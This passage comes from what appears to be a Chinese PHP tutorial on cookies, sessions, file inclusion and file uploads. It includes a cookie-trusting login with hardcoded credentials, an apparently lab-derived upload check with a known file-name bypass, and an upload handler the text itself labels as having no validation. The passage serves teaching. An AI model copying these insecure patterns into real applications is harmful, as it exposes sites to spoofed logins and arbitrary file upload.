class="line">是某些网站为了辨别用户身份，进行Session跟踪而储存在用户本地终端上的数据（通常经过加密），由用户客户端计算机暂时或永久保存</span><br><span class="line">的信息。</span><br><span class="line">2.注：这个文件与特定的 Web 文档关联在一起, 保存了该客户机访问这个Web 文档时的信息, 当客户机再次</span><br><span class="line">访问这个 Web文档时这些信息可供该文档使用。 </span><br><span class="line">3.举例：一个 Web 站点可能会为每一个访问者产生一个唯一的ID, 然后以 Cookie文件的形式保存在每个用户</span><br><span class="line">的机器上。每次客户端浏览器在发送请求的时候，都会携带cookie信息。在这个文件夹里每一个文件都是一个</span><br><span class="line">由“名/值”对（K-V）组成的文本文件,另外还有一个文件保存有所有对应的Web 站点的信息。</span><br></pre></td></tr></table></figure><p><strong>cookie 的性质</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">name      名称</span><br><span class="line">value     值</span><br><span class="line">expire    cookie生存期</span><br><span class="line">path      有效路径</span><br><span class="line">domain    指定可以访问该 Cookie 的 Web站点 或域</span><br><span class="line">secure    设置为true时，只有安全连接存在时(https)才会设置cookie</span><br><span class="line">httponly  只能通过 http协议 访问，不能通过js 访问</span><br></pre></td></tr></table></figure><p><strong>设置cookie的语句</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">setcookie();</span><br><span class="line">共有<span class="number">7</span>个属性，<span class="literal">NULL</span>为默认，只有全部默认时可以省略不写。</span><br><span class="line">例如：</span><br><span class="line">setcookie(<span class="string">&#x27;名称&#x27;</span>,<span class="string">&#x27;值&#x27;</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>); 正确</span><br><span class="line">setcookie(<span class="string">&#x27;名称&#x27;</span>,<span class="string">&#x27;值&#x27;</span>); 正确</span><br><span class="line">setcookie(<span class="string">&#x27;名称&#x27;</span>,<span class="string">&#x27;值&#x27;</span>,time()+<span class="number">600</span>); 正确 过期时间为<span class="number">10</span>分钟</span><br><span class="line">不可设置某个参数为空,如：</span><br><span class="line">setcookie(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,,,,,<span class="literal">true</span>); 错误</span><br><span class="line">服务器接收cookie信息：<span class="variable">$_COOKIE</span></span><br><span class="line">查看cookie信息：控制台</span><br></pre></td></tr></table></figure><p><strong>接收 cookie 信息</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">通过 预定义超全局数组 <span class="variable">$_COOKIE</span> 接收</span><br><span class="line">setcookie(<span class="string">&quot;num&quot;</span>,<span class="number">10</span>);</span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_COOKIE</span>[<span class="string">&quot;num&quot;</span>];</span><br><span class="line">var_dump(<span class="variable">$num</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//计算页面访问次数</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;pass&quot;</span>]))&#123;</span><br><span class="line">    setcookie(<span class="string">&quot;pass&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_COOKIE</span>[<span class="string">&quot;pass&quot;</span>];</span><br><span class="line">    <span class="variable">$num</span>++;</span><br><span class="line">    setcookie(<span class="string">&quot;pass&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_COOKIE</span>[<span class="string">&quot;pass&quot;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>COOKIE示例：简单登录界面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">welcome.php</span><br><span class="line"></span><br><span class="line">&lt;meta charset = <span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;h2&gt;心之所向论坛&lt;/h2&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;欢迎您！<span class="subst">&#123;$_COOKIE[&#x27;name&#x27;]&#125;</span>&lt;br /&gt;&lt;a href=&#x27;./logout.php&#x27;&gt;注销&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;./login.php&#x27;&gt;请登录&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">login.php</span><br><span class="line"></span><br><span class="line">&lt;meta charset = <span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;usersubmit&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;zzyy&#x27;</span> &amp;&amp;</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;userpasswd&#x27;</span>]) &amp;&amp;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;userpasswd&#x27;</span>] == <span class="string">&#x27;123456&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(setcookie(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;zzyy&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;登陆成功！&lt;a href=&#x27;./welcome.php&#x27;&gt;回到主界面&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;cookie设置错误&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;用户名或密码错误，&lt;a href=&#x27;./login.php&#x27;&gt;请重新登录&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$html</span>=<span class="string">&lt;&lt;&lt;HTML</span></span><br><span class="line"><span class="string">&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">用户名：&lt;input type=&quot;text&quot; name=&quot;username&quot; &gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">密码：&lt;input type=&quot;password&quot; name=&quot;userpasswd&quot; &gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;submit&quot; name=&quot;usersubmit&quot; value=&quot;登录&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">HTML</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cookie的注销：更改cookie的生存期为过去</span><br><span class="line">logout.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">setcookie(<span class="string">&#x27;name&#x27;</span>,<span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>],time()-<span class="number">3600</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">存在的问题：cookie的窃取，欺骗--由于cookie信息是 服务端发送给浏览器 而存储在 客户端 的</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">解决：</span><br><span class="line">session机制：session信息是储存在服务端（tmp缓存文件当中）的，相较于cookie而言，较安全</span><br><span class="line">session属性：SESSIONID</span><br><span class="line">注：</span><br><span class="line">session_start();之前不能有任何输出,将其放于php代码开头即可</span><br></pre></td></tr></table></figure><h2 id="SESSION"><a href="#SESSION" class="headerlink" title="SESSION"></a>SESSION</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">开启session机制：</span><br><span class="line">session_start(); <span class="comment">//每次都要写 </span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;pass&quot;</span>] = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">释放：</span><br><span class="line">session_destroy();</span><br></pre></td></tr></table></figure><p>SESSION示例：简单登录界面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">welcome.php</span><br><span class="line"></span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;h2&gt;欢迎来到主界面&lt;/h2&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="string">&#x27;zzyy&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;欢迎您！<span class="subst">&#123;$_SESSION[&#x27;name&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;./login.php&#x27;&gt;请登录&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;a href=&#x27;./logout.php&#x27;&gt;注销&lt;/a&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">login.php</span><br><span class="line"></span><br><span class="line"> &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();<span class="comment">//开启session机制</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;usersubmit&#x27;</span>]))&#123;</span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])&amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;userpasswd&#x27;</span>])</span><br><span class="line"> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="string">&#x27;zzyy&#x27;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;userpasswd&#x27;</span>]==<span class="number">123456</span> )&#123; <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;登录成功！&lt;a href=&#x27;./welcome.php&#x27;&gt;返回首页&lt;/a&gt;&quot;</span>;</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;用户名或密码错误！&lt;a href=&#x27;./login.php&#x27;&gt;请重新登录&lt;/a&gt;&quot;</span>;</span><br><span class="line"> &#125; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&lt;&lt;&lt;HTML</span></span><br><span class="line"><span class="string">&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;用户登录&lt;/h2&gt;</span></span><br><span class="line"><span class="string">用户名&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">密码&lt;input type=&quot;password&quot; name=&quot;userpasswd&quot;&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;submit&quot; name=&quot;usersubmit&quot; value=&quot;登录&quot; &gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">HTML</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">session 的注销：</span><br><span class="line">方法一：session_destroy()函数(运行该函数，服务器会将session缓存清空，但缓存文件依然存在)</span><br><span class="line">方法二：关闭浏览器</span><br><span class="line">    </span><br><span class="line">logout.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">session_destroy();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="PHP（十）文件操作"><a href="#PHP（十）文件操作" class="headerlink" title="PHP（十）文件操作"></a>PHP（十）文件操作</h1><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">require       <span class="comment">#报错不执行 可包含多次</span></span><br><span class="line">require_once  <span class="comment">#  只包含一次</span></span><br><span class="line"></span><br><span class="line">include   <span class="comment">#报错 继续执行 可包含多次</span></span><br><span class="line">include_once  <span class="comment">#  只包含一次</span></span><br></pre></td></tr></table></figure><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$_FILES数组内容：</span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;name&#x27;] 客户端文件的原名称</span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;type&#x27;] 文件的 MIME 类型</span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;size&#x27;] 上传文件的大小，单位为字节 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;tmp_name&#x27;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的</span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;error&#x27;] 该文件上传相关的错误代码</span><br></pre></td></tr></table></figure><p><strong>示例一：</strong>有验证</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../common.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">            <span class="comment">//mime check</span></span><br><span class="line">            <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span>(!in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//check filename</span></span><br><span class="line">                <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">                <span class="keyword">if</span> (!is_array(<span class="variable">$file</span>)) &#123;</span><br><span class="line">                    <span class="variable">$file</span> = explode(<span class="string">&#x27;.&#x27;</span>, strtolower(<span class="variable">$file</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr /&gt;&quot;</span>;</span><br><span class="line">var_dump(<span class="variable">$file</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$ext</span> = end(<span class="variable">$file</span>);</span><br><span class="line">                <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">                <span class="keyword">if</span> (!in_array(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">                    <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$file_name</span> = reset(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[count(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">                    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">                    <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">                    <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                        <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                        <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>示例二：</strong>无验证</p><p>upload.html</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;文件上传&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;1.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;upload&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;上传&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    header(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">    <span class="comment">//var_dump($_FILES);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_FILES</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;请上传文件&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//echo $_FILES[&#x27;upload&#x27;][&quot;name&quot;];</span></span><br><span class="line">        define(<span class="string">&quot;PATH&quot;</span>,dirname(<span class="keyword">__DIR__</span>));</span><br><span class="line">        <span class="variable">$path</span> = PATH.<span class="string">&quot;/&quot;</span>.<span class="string">&quot;upload&quot;</span>.<span class="string">&quot;/images&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$dir1</span> = date(<span class="string">&quot;Ym&quot;</span>);</span><br><span class="line">        <span class="variable">$dir2</span> = date(<span class="string">&quot;d&quot;</span>);</span><br><span class="line">        <span class="variable">$fullPath</span> = <span class="variable">$path</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$dir1</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$dir2</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(is_dir(<span class="variable">$fullPath</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            mkdir(<span class="variable">$fullPath</span>,<span class="number">0777</span>,<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将文件名 进行随机数命名</span></span><br><span class="line">        <span class="variable">$filename</span> = rand(<span class="number">1000</span>,<span class="number">9999</span>);</span><br><span class="line">        <span class="variable">$filetype</span> = strrchr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$fileName</span> = <span class="variable">$filename</span>.<span class="variable">$filetype</span>;</span><br><span class="line">        move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$fullPath</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$fileName</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>2.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    define(<span class="string">&quot;PATH&quot;</span>,dirname(<span class="keyword">__DIR__</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$path</span> = PATH.<span class="string">&quot;/&quot;</span>.<span class="string">&quot;upload&quot;</span>.<span class="string">&quot;/images&quot;</span>;</span><br><span class="line">    <span class="variable">$dir1</span> = date(<span 